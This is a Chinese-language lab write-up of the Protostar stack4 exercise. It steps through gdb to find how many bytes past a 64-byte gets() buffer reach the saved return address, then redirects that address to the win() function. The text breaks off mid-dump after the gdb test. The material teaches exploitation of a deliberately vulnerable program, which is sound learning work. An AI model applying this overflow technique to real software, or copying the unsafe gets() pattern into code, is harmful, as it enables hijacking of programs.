---
title: Protostar_stack4
updated: 2024-02-18 08:52:06Z
created: 2023-11-22 02:31:02Z
---

**运行该程序，得到：**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/ccb9efc32f7aa26df31421d720649538.png" alt="ccb9efc32f7aa26df31421d720649538.png" width="554" height="89" class="jop-noMdConv">**

### **Source code:**

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

**checksec:**

```
┌──(kali㉿kali)-[/opt/protostar/bin]
└─$ checksec --file=./stack4 
[*] '/opt/protostar/bin/stack4'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

**objdump:**

```
┌──(kali㉿kali)-[/opt/protostar/bin]
└─$ objdump -t -j .text ./stack4 

./stack4:     file format elf32-i386

SYMBOL TABLE:
08048340 l    d  .text  00000000              .text
08048370 l     F .text  00000000              __do_global_dtors_aux
080483d0 l     F .text  00000000              frame_dummy
08048490 l     F .text  00000000              __do_global_ctors_aux
08048420 g     F .text  00000005              __libc_csu_fini
08048340 g     F .text  00000000              _start
080483f4 g     F .text  00000014              win
08048430 g     F .text  0000005a              __libc_csu_init
0804848a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
08048408 g     F .text  00000017              main
```

**查看汇编代码:**

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048408 <+0>:     push   ebp
   0x08048409 <+1>:     mov    ebp,esp
   0x0804840b <+3>:     and    esp,0xfffffff0
   0x0804840e <+6>:     sub    esp,0x50
   0x08048411 <+9>:     lea    eax,[esp+0x10]
   0x08048415 <+13>:    mov    DWORD PTR [esp],eax
   0x08048418 <+16>:    call   0x804830c <gets@plt>
   0x0804841d <+21>:    leave
   0x0804841e <+22>:    ret
End of assembler dump.
gdb-peda$ disass win
Dump of assembler code for function win:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x18
   0x080483fa <+6>:     mov    DWORD PTR [esp],0x80484e0
   0x08048401 <+13>:    call   0x804832c <puts@plt>
   0x08048406 <+18>:    leave
   0x08048407 <+19>:    ret
End of assembler dump.
```

**调试过程如下：**

```
(gdb) i b
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08048408 in main at stack4/stack4.c:12
2       breakpoint     keep y   0x08048409 in main at stack4/stack4.c:12
3       breakpoint     keep y   0x0804840b in main at stack4/stack4.c:12
4       breakpoint     keep y   0x0804840e in main at stack4/stack4.c:12
5       breakpoint     keep y   0x08048411 in main at stack4/stack4.c:15
6       breakpoint     keep y   0x08048415 in main at stack4/stack4.c:15
7       breakpoint     keep y   0x08048418 in main at stack4/stack4.c:15
8       breakpoint     keep y   0x0804841d in main at stack4/stack4.c:16
9       breakpoint     keep y   0x0804841e in main at stack4/stack4.c:16
```

`0x8048408 <main>: push ebp：`

**1、**`push ebp:`**将当前函数的基址指针（ebp）的值压入栈中，保存当前函数的栈帧**

```
(gdb) r
Starting program: /opt/protostar/bin/stack4 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, main (argc=<error reading variable: Unknown argument list address for `argc'.>, 
    argv=<error reading variable: Unknown argument list address for `argv'.>) at stack4/stack4.c:12
12      stack4/stack4.c: No such file or directory.
(gdb) i r
eax            0x8048408           134513672
ecx            0x89ae3a96          -1985070442
edx            0xffffcfd0          -12336
ebx            0xf7e1dff4          -136192012
esp            0xffffcfac          0xffffcfac
ebp            0x0                 0x0
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x8048408           0x8048408 <main>
eflags         0x246               [ PF ZF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x8048408 <main>:    push   ebp
   0x8048409 <main+1>:  mov    ebp,esp
   0x804840b <main+3>:  and    esp,0xfffffff0
   0x804840e <main+6>:  sub    esp,0x50
   0x8048411 <main+9>:  lea    eax,[esp+0x10]
   0x8048415 <main+13>: mov    DWORD PTR [esp],eax
   0x8048418 <main+16>: call   0x804830c <gets@plt>
   0x804841d <main+21>: leave
   0x804841e <main+22>: ret
   0x804841f:   nop
(gdb) x/20wx $esp
0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c
0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
0xffffcfdc:     0x00000000      0xf25e5086      0x89ae3a96      0x00000000
0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
```

执行`push ebp`后，`esp 0xffffcfac -> 0xffffcfa8`

2、`mov ebp,esp：`**将当前栈指针的值赋给基址指针，建立当前函数的栈帧。**

```
(gdb) n

Breakpoint 2, 0x08048409 in main (argc=<error reading variable: Unknown argument list address for `argc'.>, 
    argv=<error reading variable: Unknown argument list address for `argv'.>) at stack4/stack4.c:12
12      in stack4/stack4.c
(gdb) i r
eax            0x8048408           134513672
ecx            0x89ae3a96          -1985070442
edx            0xffffcfd0          -12336
ebx            0xf7e1dff4          -136192012
esp            0xffffcfa8          0xffffcfa8
ebp            0x0                 0x0
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x8048409           0x8048409 <main+1>
eflags         0x246               [ PF ZF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x8048409 <main+1>:  mov    ebp,esp
   0x804840b <main+3>:  and    esp,0xfffffff0
   0x804840e <main+6>:  sub    esp,0x50
   0x8048411 <main+9>:  lea    eax,[esp+0x10]
   0x8048415 <main+13>: mov    DWORD PTR [esp],eax
   0x8048418 <main+16>: call   0x804830c <gets@plt>
   0x804841d <main+21>: leave
   0x804841e <main+22>: ret
   0x804841f:   nop
   0x8048420 <__libc_csu_fini>: push   ebp
(gdb) x/20wx $esp
0xffffcfa8:     0x00000000      0xf7c237c5      0x00000001      0xffffd064
0xffffcfb8:     0xffffd06c      0xffffcfd0      0xf7e1dff4      0x08048408
0xffffcfc8:     0x00000001      0xffffd064      0xf7e1dff4      0x08048430
0xffffcfd8:     0xf7ffcba0      0x00000000      0xf25e5086      0x89ae3a96
0xffffcfe8:     0x00000000      0x00000000      0x00000000      0xf7ffcba0
```

&nbsp;执行`mov ebp,esp`后，`ebp = esp = 0xffffcfa8`

3、`and esp,0xfffffff0：`**将栈指针与0xfffffff0进行按位与操作，将栈指针向下舍入到16字节边界，以对齐栈。**

```
(gdb) n

Breakpoint 3, 0x0804840b in main (argc=1, argv=0xffffd064) at stack4/stack4.c:12
12      in stack4/stack4.c
(gdb) i r
eax            0x8048408           134513672
ecx            0x89ae3a96          -1985070442
edx            0xffffcfd0          -12336
ebx            0xf7e1dff4          -136192012
esp            0xffffcfa8          0xffffcfa8
ebp            0xffffcfa8          0xffffcfa8
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x804840b           0x804840b <main+3>
eflags         0x246               [ PF ZF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x804840b <main+3>:  and    esp,0xfffffff0
   0x804840e <main+6>:  sub    esp,0x50
   0x8048411 <main+9>:  lea    eax,[esp+0x10]
   0x8048415 <main+13>: mov    DWORD PTR [esp],eax
   0x8048418 <main+16>: call   0x804830c <gets@plt>
   0x804841d <main+21>: leave
   0x804841e <main+22>: ret
   0x804841f:   nop
   0x8048420 <__libc_csu_fini>: push   ebp
   0x8048421 <__libc_csu_fini+1>:       mov    ebp,esp
(gdb) x/20wx $esp
0xffffcfa8:     0x00000000      0xf7c237c5      0x00000001      0xffffd064
0xffffcfb8:     0xffffd06c      0xffffcfd0      0xf7e1dff4      0x08048408
0xffffcfc8:     0x00000001      0xffffd064      0xf7e1dff4      0x08048430
0xffffcfd8:     0xf7ffcba0      0x00000000      0xf25e5086      0x89ae3a96
0xffffcfe8:     0x00000000      0x00000000      0x00000000      0xf7ffcba0
```

&nbsp;执行`and esp,0xfffffff0`后，`esp 0xffffcfa8 - > 0xffffcfa0`，可以看到`0xffffcfa0: 0x00000000 0x00000078 0x00000000 0xf7c237c5`这一行，esp被对齐

4、`sub esp,0x50：`**分配80字节的局部变量空间，通过将栈指针向下移动来实现。**

```
(gdb) n

Breakpoint 4, 0x0804840e in main (argc=1, argv=0xffffd064) at stack4/stack4.c:12
12      in stack4/stack4.c
(gdb) i r
eax            0x8048408           134513672
ecx            0x89ae3a96          -1985070442
edx            0xffffcfd0          -12336
ebx            0xf7e1dff4          -136192012
esp            0xffffcfa0          0xffffcfa0
ebp            0xffffcfa8          0xffffcfa8
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x804840e           0x804840e <main+6>
eflags         0x286               [ PF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x804840e <main+6>:  sub    esp,0x50
   0x8048411 <main+9>:  lea    eax,[esp+0x10]
   0x8048415 <main+13>: mov    DWORD PTR [esp],eax
   0x8048418 <main+16>: call   0x804830c <gets@plt>
   0x804841d <main+21>: leave
   0x804841e <main+22>: ret
   0x804841f:   nop
   0x8048420 <__libc_csu_fini>: push   ebp
   0x8048421 <__libc_csu_fini+1>:       mov    ebp,esp
   0x8048423 <__libc_csu_fini+3>:       pop    ebp
(gdb) x/20wx $esp
0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
```

&nbsp;执行`sub esp,0x50`后，`esp 0xffffcfa0 - > 0xffffcf50`

5、`lea eax,[esp+0x10]：`**计算并将`esp+0x10`的地址存储在eax寄存器中。此处可能在准备调用`gets`函数之前，为输入缓冲区分配空间。**

```
(gdb) n
```

Copy Copied

```
 Breakpoint 5, main (argc=1, argv=0xffffd064) at stack4/stack4.c:15 15 in stack4/stack4.c (gdb) i r eax 0x8048408 134513672 ecx 0x89ae3a96 -1985070442 edx 0xffffcfd0 -12336 ebx 0xf7e1dff4 -136192012 esp 0xffffcf50 0xffffcf50 ebp 0xffffcfa8 0xffffcfa8 esi 0x8048430 134513712 edi 0xf7ffcba0 -134231136 eip 0x8048411 0x8048411 <main+9> eflags 0x286 [ PF SF IF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99 (gdb) x/10i $eip => 0x8048411 <main+9>: lea eax,[esp+0x10] 0x8048415 <main+13>: mov DWORD PTR [esp],eax 0x8048418 <main+16>: call 0x804830c <gets@plt> 0x804841d <main+21>: leave 0x804841e <main+22>: ret 0x804841f: nop 0x8048420 <__libc_csu_fini>: push ebp 0x8048421 <__libc_csu_fini+1>: mov ebp,esp 0x8048423 <__libc_csu_fini+3>: pop ebp 0x8048424 <__libc_csu_fini+4>: ret (gdb) x/20wx $esp 0xffffcf50: 0xf7ffcff4 0x0000000c 0x00000000 0xffffdfde 0xffffcf60: 0xf7fc8580 0x00000000 0xf7c1c9a2 0xf7e1e04c 0xffffcf70: 0xf7fc2400 0xf7fd9e8b 0xf7c1c9a2 0xf7fc2400 0xffffcf80: 0xffffcfc0 0xf7fc25d8 0xf7fc2aa0 0x00000001 0xffffcf90: 0x00000001 0x00000000 0x00000000 0x00000000 
```

&nbsp;6、`mov DWORD PTR [esp],eax:`**将eax寄存器中的值存储到栈的顶部，这是作为参数传递给`gets`函数的地址。**

```
(gdb) n

Breakpoint 6, 0x08048415 in main (argc=1, argv=0xffffd064) at stack4/stack4.c:15
15      in stack4/stack4.c
(gdb) i r
eax            0xffffcf60          -12448
ecx            0x89ae3a96          -1985070442
edx            0xffffcfd0          -12336
ebx            0xf7e1dff4          -136192012
esp            0xffffcf50          0xffffcf50
ebp            0xffffcfa8          0xffffcfa8
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x8048415           0x8048415 <main+13>
eflags         0x286               [ PF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x8048415 <main+13>: mov    DWORD PTR [esp],eax
   0x8048418 <main+16>: call   0x804830c <gets@plt>
   0x804841d <main+21>: leave
   0x804841e <main+22>: ret
   0x804841f:   nop
   0x8048420 <__libc_csu_fini>: push   ebp
   0x8048421 <__libc_csu_fini+1>:       mov    ebp,esp
   0x8048423 <__libc_csu_fini+3>:       pop    ebp
   0x8048424 <__libc_csu_fini+4>:       ret
   0x8048425:   lea    esi,[esi+eiz*1+0x0]
(gdb) x/64wx $esp
0xffffcf50:     0xf7ffcff4      0x0000000c      0x00000000      0xffffdfde
0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c
0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400
0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001
0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000
0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430
```

7、`call 0x804830c gets@plt:`**调用`gets`函数，它从标准输入中读取字符串并将其存储在之前分配的地址中。然而，`gets`函数是一个不安全的函数，容易受到缓冲区溢出攻击。**

```
(gdb) n

Breakpoint 7, 0x08048418 in main (argc=1, argv=0xffffd064) at stack4/stack4.c:15
15      in stack4/stack4.c
(gdb) i r
eax            0xffffcf60          -12448
ecx            0x89ae3a96          -1985070442
edx            0xffffcfd0          -12336
ebx            0xf7e1dff4          -136192012
esp            0xffffcf50          0xffffcf50
ebp            0xffffcfa8          0xffffcfa8
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x8048418           0x8048418 <main+16>
eflags         0x286               [ PF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x8048418 <main+16>: call   0x804830c <gets@plt>
   0x804841d <main+21>: leave
   0x804841e <main+22>: ret
   0x804841f:   nop
   0x8048420 <__libc_csu_fini>: push   ebp
   0x8048421 <__libc_csu_fini+1>:       mov    ebp,esp
   0x8048423 <__libc_csu_fini+3>:       pop    ebp
   0x8048424 <__libc_csu_fini+4>:       ret
   0x8048425:   lea    esi,[esi+eiz*1+0x0]
   0x8048429:   lea    edi,[edi+eiz*1+0x0]
(gdb) x/64wx $esp
0xffffcf50:     0xffffcf60      0x0000000c      0x00000000      0xffffdfde
0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c
0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400
0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001
0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000
0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430
```

8、`leave:`**恢复栈帧，相当于`mov esp, ebp` 和 `pop ebp` 的组合，释放栈空间。**

```是
(gdb) n
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa    

Breakpoint 8, main (argc=1, argv=0xffffd064) at stack4/stack4.c:16
16      in stack4/stack4.c
(gdb) i r
eax            0xffffcf60          -12448
ecx            0xf7e1f9c4          -136185404
edx            0x0                 0
ebx            0xf7e1dff4          -136192012
esp            0xffffcf50          0xffffcf50
ebp            0xffffcfa8          0xffffcfa8
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x804841d           0x804841d <main+21>
eflags         0x246               [ PF ZF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x804841d <main+21>: leave
   0x804841e <main+22>: ret
   0x804841f:   nop
   0x8048420 <__libc_csu_fini>: push   ebp
   0x8048421 <__libc_csu_fini+1>:       mov    ebp,esp
   0x8048423 <__libc_csu_fini+3>:       pop    ebp
   0x8048424 <__libc_csu_fini+4>:       ret
   0x8048425:   lea    esi,[esi+eiz*1+0x0]
   0x8048429:   lea    edi,[edi+eiz*1+0x0]
   0x8048430 <__libc_csu_init>: push   ebp
(gdb) x/64wx $esp
0xffffcf50:     0xffffcf60      0x0000000c      0x00000000      0xffffdfde
0xffffcf60:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcf70:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcf80:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcf90:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430
</main+22></main+21></main+21>
```

9、`ret：`**返回，结束函数。**

```
(gdb) n

Breakpoint 9, 0x0804841e in main (argc=<error reading variable: Unknown argument list address for `argc'.>, 
    argv=<error reading variable: Unknown argument list address for `argv'.>) at stack4/stack4.c:16
16      in stack4/stack4.c
(gdb) i r
eax            0xffffcf60          -12448
ecx            0xf7e1f9c4          -136185404
edx            0x0                 0
ebx            0xf7e1dff4          -136192012
esp            0xffffcfac          0xffffcfac
ebp            0x0                 0x0
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x804841e           0x804841e <main+22>
eflags         0x246               [ PF ZF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x804841e <main+22>: ret
   0x804841f:   nop
   0x8048420 <__libc_csu_fini>: push   ebp
   0x8048421 <__libc_csu_fini+1>:       mov    ebp,esp
   0x8048423 <__libc_csu_fini+3>:       pop    ebp
   0x8048424 <__libc_csu_fini+4>:       ret
   0x8048425:   lea    esi,[esi+eiz*1+0x0]
   0x8048429:   lea    edi,[edi+eiz*1+0x0]
   0x8048430 <__libc_csu_init>: push   ebp
   0x8048431 <__libc_csu_init+1>:       mov    ebp,esp
(gdb) x/64wx $esp
0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c
0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
0xffffcfdc:     0x00000000      0xf25e5086      0x89ae3a96      0x00000000
0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
0xffffcffc:     0x1d1faa00      0xf7ffda20      0xf7c23756      0xf7e1dff4
0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001
0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809
0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000
0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064
0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c
0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000
0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297
0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319
0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372
0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a
```

执行完`ret`指令后，再次查看相应变化，可以见到并未执行win函数；

```
(gdb) n
__libc_start_call_main (main=main@entry=0x8048408 <main>, argc=argc@entry=1, argv=argv@entry=0xffffd064)
    at ../sysdeps/nptl/libc_start_call_main.h:74
74      ../sysdeps/nptl/libc_start_call_main.h: No such file or directory.
(gdb) i r
eax            0xffffcf60          -12448
ecx            0xf7e1f9c4          -136185404
edx            0x0                 0
ebx            0xf7e1dff4          -136192012
esp            0xffffcfc0          0xffffcfc0
ebp            0x0                 0x0
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0xf7c237c8          0xf7c237c8 <__libc_start_call_main+120>
eflags         0x286               [ PF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0xf7c237c8 <__libc_start_call_main+120>:     sub    esp,0xc
   0xf7c237cb <__libc_start_call_main+123>:     push   eax
   0xf7c237cc <__libc_start_call_main+124>:     call   0xf7c3c1a0 <__GI_exit>
   0xf7c237d1 <__libc_start_call_main+129>:     call   0xf7c84320 <__GI___nptl_deallocate_tsd>
   0xf7c237d6 <__libc_start_call_main+134>:     mov    eax,DWORD PTR [esp]
   0xf7c237d9 <__libc_start_call_main+137>:     lock sub DWORD PTR [eax+0x124],0x1
   0xf7c237e1 <__libc_start_call_main+145>:     je     0xf7c237fb <__libc_start_call_main+171>
   0xf7c237e3 <__libc_start_call_main+147>:     mov    edx,0x1
   0xf7c237e8 <__libc_start_call_main+152>:     xor    ebx,ebx
   0xf7c237ea <__libc_start_call_main+154>:     lea    esi,[esi+0x0]
(gdb) x/64wx $esp
0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430
0xffffd050:     0x08048420      0xf7fcecd0      0xffffd05c      0xf7ffda20
0xffffd060:     0x00000001      0xffffd237      0x00000000      0xffffd251
0xffffd070:     0xffffd260      0xffffd274      0xffffd297      0xffffd2cd
0xffffd080:     0xffffd2ee      0xffffd2fb      0xffffd319      0xffffd335
0xffffd090:     0xffffd351      0xffffd361      0xffffd372      0xffffd37c
0xffffd0a0:     0xffffd389      0xffffd3a8      0xffffd44a      0xffffd468
0xffffd0b0:     0xffffd483      0xffffd49a      0xffffd4ad      0xffffd4cb
```

* * *

**分析：**

可以看到，在`call 0x804830c <gets@plt>`,程序需要我们的输入，于是我们输入输入了长度为64的‘a’,即‘a’\*64;

然后我们观察输入后的栈结构，如下图所示：

![cda33c621ffad14e3aa3080d83715d8c.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/cda33c621ffad14e3aa3080d83715d8c.png)

但是从最后的结果来看，长度为64并没有成功溢出跳转到win函数，所以我们继续往下看，寻找ret的返回地址，如下图：

![09e35fd05d53af1991ea954b8a4919b3.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/09e35fd05d53af1991ea954b8a4919b3.png)

从上图可以看到，即将执行的`ret`的存储的返回地址就是此刻位于栈顶的`0xf7c237c5`

那么，我们的目标就是：**输入足够的长度，覆盖到**`0xf7c237c5`**为止**

**![71e8ba41829cfceb7764e8adc3b8f68d.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/71e8ba41829cfceb7764e8adc3b8f68d.png)**

**从上图中可以很清晰的看到，我们还需要填充(3组)x(每组4字节)=（一共12字节）的长度，才能达到返回地址前，然后再用目标地址覆盖原来的返回地址**

**我们的目标地址应当是win函数的地址，如下：win函数地址为`0x80483f4`**

```
(gdb) print win
$7 = {void (void)} 0x80483f4 <win>
```

**我们也可以在执行ret前做一下测试，用set命令直接修改`0xf7c237c5`为`0x80483f4`，过程如下：**

```
(gdb) n

Breakpoint 9, 0x0804841e in main (argc=<error reading variable: Unknown argument list address for `argc'.>, 
    argv=<error reading variable: Unknown argument list address for `argv'.>) at stack4/stack4.c:16
16      in stack4/stack4.c
(gdb) i r
eax            0xffffcf60          -12448
ecx            0xf7e1f9c4          -136185404
edx            0x0                 0
ebx            0xf7e1dff4          -136192012
esp            0xffffcfac          0xffffcfac
ebp            0x0                 0x0
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x804841e           0x804841e <main+22>
eflags         0x246               [ PF ZF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x804841e <main+22>: ret
   0x804841f:   nop
   0x8048420 <__libc_csu_fini>: push   ebp
   0x8048421 <__libc_csu_fini+1>:       mov    ebp,esp
   0x8048423 <__libc_csu_fini+3>:       pop    ebp
   0x8048424 <__libc_csu_fini+4>:       ret
   0x8048425:   lea    esi,[esi+eiz*1+0x0]
   0x8048429:   lea    edi,[edi+eiz*1+0x0]
   0x8048430 <__libc_csu_init>: push   ebp
   0x8048431 <__libc_csu_init+1>:       mov    ebp,esp
(gdb) x/64wx $esp
0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c
0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
0xffffcfdc:     0x00000000      0x926a73bc      0xe99a19ac      0x00000000
0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
0xffffcffc:     0xbe8c9100      0xf7ffda20      0xf7c23756      0xf7e1dff4
0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001
0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809
0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000
0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064
0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c
0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000
0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297
0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319
0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372
0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a
(gdb) set *0xffffcfac=0x80483f4
(gdb) x/64wx $esp
0xffffcfac:     0x080483f4      0x00000001      0xffffd064      0xffffd06c
0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
0xffffcfdc:     0x00000000      0x926a73bc      0xe99a19ac      0x00000000
0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000
0xffffcffc:     0xbe8c9100      0xf7ffda20      0xf7c23756      0xf7e1dff4
0xffffd00c:     0xf7c23888      0xf7fcaac4      0xf7ffcff4      0x00000001
